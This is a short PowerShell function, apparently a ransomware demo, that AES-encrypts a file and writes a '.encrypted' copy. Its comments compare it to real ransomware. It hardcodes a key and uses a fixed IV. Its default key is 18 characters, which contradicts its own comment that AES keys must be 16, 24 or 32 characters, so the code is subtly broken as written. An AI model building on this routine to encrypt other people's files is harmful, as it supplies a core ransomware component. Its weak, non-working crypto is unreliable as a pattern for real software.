function Invoke-FileEncrypt {
    param (
        [string]$Path,
        [string]$Key = "SuperSecretKey1234" # must be 16/24/32 chars for AES
    )

    $AES = New-Object System.Security.Cryptography.AesManaged
    $AES.Key = [Text.Encoding]::UTF8.GetBytes($Key)
    $AES.IV  = [byte[]](1..16) # static IV for demo (real ransomware randomizes this)

    $bytes   = [IO.File]::ReadAllBytes($Path)
    $stream  = New-Object IO.MemoryStream
    $encryptor = $AES.CreateEncryptor()
    $cryptoStream = New-Object Security.Cryptography.CryptoStream($stream,$encryptor,[Security.Cryptography.CryptoStreamMode]::Write)
    $cryptoStream.Write($bytes,0,$bytes.Length)
    $cryptoStream.Close()

    $encFile = $Path + ".encrypted"
    [IO.File]::WriteAllBytes($encFile,$stream.ToArray())
    Write-Host "[+] Encrypted $Path -> $encFile"
}
